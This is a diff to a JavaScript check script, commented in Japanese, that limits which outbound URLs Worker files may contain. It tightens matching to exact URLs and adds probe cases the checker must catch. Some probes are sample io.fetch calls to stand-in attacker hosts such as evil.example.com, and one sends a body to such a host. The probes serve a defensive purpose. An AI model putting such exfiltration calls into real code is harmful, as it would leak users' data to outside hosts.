@@ -179,9 +179,11 @@ if (!/function readSample\(/.test(read('js/ai-reader.js'))) fail('js/ai-reader.j
 const workerFiles = readdirSync(new URL('worker/', root)).filter(f => f.endsWith('.mjs')).map(f => `worker/${f}`);
 if (!workerFiles.length) fail('worker/ に Worker が無い');
 workerFiles.filter(f => !listed.has(f)).forEach(f => fail(`表 1 に無い Worker のファイル: ${f}`));
-/* 外の URL は、ファイルごとに決めた先（前方一致）だけ。fakes.mjs は Access の見本の先だけ */
-const WORKER_NET = { 'worker/index.mjs': { kind: 'live', urls: [] }, 'worker/access.mjs': { kind: 'io', urls: ['https://${'] },
-  'worker/anthropic.mjs': { kind: 'io', urls: ['https://api.anthropic.com/v1/messages'] }, 'worker/fakes.mjs': { kind: 'fake', urls: ['https://${'] } };
+/* 外の URL は、ファイルごとに決めた先（完全一致）だけ。fakes.mjs は Access の見本の先だけ。
+   検査で追えない形（io.fetch(env.X)、文字を足して作った URL）は、テストの io.fetch が知らない先で例外を出すことで止める */
+const ACCESS_URLS = ['https://${team}/cdn-cgi/access/certs', 'https://${team}'];
+const WORKER_NET = { 'worker/index.mjs': { kind: 'live', urls: [] }, 'worker/access.mjs': { kind: 'io', urls: ACCESS_URLS },
+  'worker/anthropic.mjs': { kind: 'io', urls: ['https://api.anthropic.com/v1/messages'] }, 'worker/fakes.mjs': { kind: 'fake', urls: ACCESS_URLS } };
 const WORKER_TOOLS = NET_TOOLS.filter(([re]) => !/\(\?:https\?\|wss\?\|ftp\)/.test(re.source) && !/\(\?:\\\/\\\/\|/.test(re.source));
 function workerRules(p) {
   const net = WORKER_NET[p] || { kind: 'none', urls: [] };
@@ -192,7 +194,7 @@ function workerRules(p) {
 }
 function workerUrlProblems(src, urls) {
   const keep = stripComments(src, false).join('\n');
-  return [...keep.matchAll(/\b(?:https?|wss?|ftp):[\\/]{2}[^\s'"`]*/gi)].map(m => m[0]).filter(u => !urls.some(a => u.startsWith(a)));
+  return [...keep.matchAll(/\b(?:https?|wss?|ftp):[\\/]{2}[^\s'"`]*/gi)].map(m => m[0]).filter(u => !urls.includes(u));
 }
 workerFiles.forEach(p => {
   const rules = workerRules(p);
@@ -217,7 +219,9 @@ const WORKER_PROBES = [['const r = await fetch(u);', 'worker/handler.mjs'], ['co
   ["import { fakeKv } from './fakes.mjs';", 'worker/handler.mjs'], ["import { fakeAccess } from './fakes.mjs';", 'worker/index.mjs']];
 WORKER_PROBES.forEach(([code, p]) => { if (!violations(code, workerRules(p)).length) fail(`検査が甘い: ${p} の「${code}」を見逃した`); });
 [["const u = 'https://evil.example.com/x';", 'worker/read-core.mjs'], ["await io.fetch('https://evil.example.com/', { body: k });", 'worker/anthropic.mjs'],
-  ["await io.fetch(`https://api.anthropic.com.evil.example/v1`);", 'worker/anthropic.mjs'], ["const u = 'https://api.anthropic.com/v1/messages';", 'worker/access.mjs']]
+  ["await io.fetch(`https://api.anthropic.com.evil.example/v1`);", 'worker/anthropic.mjs'], ["const u = 'https://api.anthropic.com/v1/messages';", 'worker/access.mjs'],
+  ["await io.fetch(`https://${'evil.example.com'}/x`);", 'worker/access.mjs'], ["await io.fetch(`https://${team}/other`);", 'worker/access.mjs'],
+  ["await io.fetch('https://api.anthropic.com/v1/messages/../files');", 'worker/anthropic.mjs']]
   .forEach(([code, p]) => { if (!workerUrlProblems(code, workerRules(p).urls).length) fail(`検査が甘い: ${p} の外の先「${code}」を見逃した`); });
 ["import { verifyAccess } from './access.mjs';", "import { x } from '../worker/budget.mjs';", "import '../worker/fakes.mjs';", "const m = await import('./anthropic.mjs');"]
   .forEach(code => { if (!CORE_IMPORT_BAN.test(code)) fail(`検査が甘い: core の「${code}」を見逃した`); });
